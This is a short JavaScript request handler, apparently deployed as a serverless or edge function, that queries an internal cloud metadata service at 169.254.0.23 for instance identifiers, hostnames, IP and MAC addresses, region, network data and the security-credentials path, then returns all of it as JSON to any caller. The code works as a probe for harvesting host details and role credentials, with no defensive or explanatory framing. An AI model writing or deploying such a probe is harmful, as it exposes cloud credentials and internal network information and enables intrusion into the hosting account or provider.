export async function onRequest(context) {
  const out = {};
  const t = async (name, fn) => { try { out[name] = await fn(); } catch (e) { out[name] = 'ERR:' + String(e).slice(0, 250); } };
  const md = (p) => fetch('http://169.254.0.23/latest/meta-data/' + p, {signal: AbortSignal.timeout(3000)}).then(async r => ({status: r.status, body: (await r.text()).slice(0, 300)}));
  await t('appId', () => md('app-id'));
  await t('uuid', () => md('uuid'));
  await t('instanceName', () => md('instance-name'));
  await t('hostname', () => md('hostname'));
  await t('localIpv4', () => md('local-ipv4'));
  await t('publicIpv4', () => md('public-ipv4'));
  await t('mac', () => md('mac'));
  await t('placement', () => md('placement/region'));
  await t('zone', () => md('placement/zone'));
  await t('camList', () => md('cam/security-credentials/'));
  await t('camRole', () => md('cam/security-credentials/'));
  await t('network', () => md('network/'));
  return new Response(JSON.stringify(out), { headers: { 'Content-Type': 'application/json' } });
}
